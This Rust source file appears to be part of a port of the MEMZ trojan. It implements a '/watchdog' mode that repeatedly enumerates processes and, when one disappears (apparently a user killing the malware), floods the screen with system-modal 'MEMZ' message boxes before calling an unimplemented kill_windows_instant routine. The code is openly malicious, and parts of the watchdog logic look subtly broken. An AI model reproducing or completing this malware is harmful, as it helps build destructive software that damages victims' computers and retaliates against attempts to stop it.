#![allow(unused_imports)]
#![allow(dead_code)]
use memz_rs::{
    convert_str::ToPCSTRWrapper,
    data::data::msgs,
    payloads::payloads::msg_box_hook,
    wrap_windows_api::{
        lstrcmp_w, wrap_close_handle, wrap_create_toolhelp32_snapshot, wrap_get_current_thread_id,
        wrap_get_process_image_filename_a, wrap_messagebox_a, wrap_process32_next,
        wrap_set_windows_hook_ex_a, Commandline, Resolution, wrap_unhook_windows_hook_ex,
    },
    LMEM_ZEROINIT,
};
use rand::Rng;
use std::{
    mem::size_of,
    thread::{self, sleep},
    time::Duration,
};
use windows::{
    core::PCSTR,
    Win32::{
        Foundation::{BOOL, HANDLE, HMODULE, HWND, INVALID_HANDLE_VALUE},
        Graphics::Gdi::HFONT,
        System::{
            Diagnostics::ToolHelp::{Process32First, PROCESSENTRY32},
            Threading::{OpenProcess, PROCESS_QUERY_INFORMATION},
        },
        UI::WindowsAndMessaging::{HOOKPROC, MB_ICONHAND, MB_OK, MB_SYSTEMMODAL, WH_CBT},
    },
};

// #[cfg(feature="CLEAN")]
struct Clean {
    main_window: HWND,
    font: HFONT,
    dialog: HWND,
}

fn kill_windows() {
    for _ in 0..20 {
        let rip_message_thread = thread::spawn(move || -> Result<(), ()> {
            let hook = wrap_set_windows_hook_ex_a(
                WH_CBT,
                Some(msg_box_hook),
                HMODULE(0 as isize),
                wrap_get_current_thread_id(),
            )?;
            let mut rng = rand::thread_rng();
            let random = rng.gen_range(0..=25);
            wrap_messagebox_a(
                HWND(Default::default()),
                *msgs[random as usize].to_pcstr(),
                "MEMZ",
                MB_OK | MB_SYSTEMMODAL | MB_ICONHAND,
            )?;
            wrap_unhook_windows_hook_ex(hook)?;
            Ok(())
        });
        rip_message_thread.join().unwrap().unwrap();
        sleep(Duration::from_millis(100));
    }

    kill_windows_instant()
}

fn kill_windows_instant() {
    todo!()
}

fn main() -> windows::core::Result<()> {
    let res = Resolution::new();
    println!("{} {}", res.scrw, res.scrh);

    // #[cfg(feature="CLEAN")]
    {
        let cmdline = Commandline::new();
        let argc = cmdline.argc;
        let arg = cmdline.arg;

        if argc > 1 {
            if lstrcmp_w(arg, "/watchdog") {
                let watchdog_thread = thread::spawn(move || -> Result<(), ()> {
                    let mut oproc = 0;
                    let mut f_buf1: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
                    wrap_get_process_image_filename_a(&mut f_buf1)?;

                    sleep(Duration::from_millis(1000));

                    loop {
                        let snapshot = wrap_create_toolhelp32_snapshot()?;

                        let mut proc: PROCESSENTRY32 = PROCESSENTRY32 {
                            dwSize: size_of::<PROCESSENTRY32> as u32,
                            ..Default::default()
                        };

                        unsafe {
                            Process32First(snapshot, &mut proc as *mut PROCESSENTRY32);
                        }

                        let mut nproc = 0;
                        loop {
                            let h_proc: Option<HANDLE>;
                            unsafe {
                                h_proc = match OpenProcess(
                                    PROCESS_QUERY_INFORMATION,
                                    BOOL(0),
                                    proc.th32ProcessID,
                                ) {
                                    Ok(handle) => Some(handle),
                                    Err(e) => {
                                        eprintln!("{e}");
                                        None
                                    }
                                };
                            }
                            let mut f_buf2: Vec<u8> = vec![LMEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
                            wrap_get_process_image_filename_a(&mut f_buf2)?;

                            if f_buf1 != f_buf2 {
                                nproc += 1;
                            }

                            wrap_close_handle(h_proc.unwrap_or(INVALID_HANDLE_VALUE))?;
                            drop(f_buf2);

                            if wrap_process32_next(snapshot, &mut proc)? {
                                break;
                            }
                        }
                        wrap_close_handle(snapshot)?;

                        if nproc < oproc {
                            kill_windows()
                        }

                        oproc = nproc;

                        sleep(Duration::from_millis(10));
                    }
                });
                watchdog_thread.join().unwrap().unwrap();
            }
        }
    }
    Ok(())
}
